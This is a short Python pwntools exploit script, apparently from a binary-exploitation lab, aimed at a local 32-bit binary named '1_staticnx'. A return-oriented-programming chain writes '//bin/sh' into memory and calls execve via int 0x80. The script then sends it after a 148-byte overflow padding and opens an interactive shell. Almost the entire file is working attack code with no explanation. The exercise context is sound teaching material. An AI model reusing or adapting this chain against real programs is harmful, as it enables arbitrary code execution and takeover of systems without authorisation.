#!/usr/bin/python

from pwn import *

from struct import pack

p = lambda x : pack('I', x)

IMAGE_BASE_0 = 0x08048000 # 1_staticnx
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += '//bi'
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6060)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += 'n/sh'
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6064)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000036ca) # 0x0804b6ca: pop dword ptr [ecx]; ret;
rop += p(0x00000000)
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += p(0x00000000)
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x0000c95b) # 0x0805495b: mov dword ptr [edx], eax; ret;
rop += rebase_0(0x000001d1) # 0x080481d1: pop ebx; ret;
rop += rebase_0(0x000a6060)
rop += rebase_0(0x0009afc9) # 0x080e2fc9: pop ecx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x0002a99a) # 0x0807299a: pop edx; ret;
rop += rebase_0(0x000a6068)
rop += rebase_0(0x00073b46) # 0x080bbb46: pop eax; ret;
rop += p(0x0000000b)
rop += rebase_0(0x0002afa0) # 0x08072fa0: int 0x80; ret;

def main():
    # Start the process
    p = process("../build/1_staticnx")

    # Craft the payload
    payload = "A"*148 + rop
    payload = payload.ljust(1000, "\x00")

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
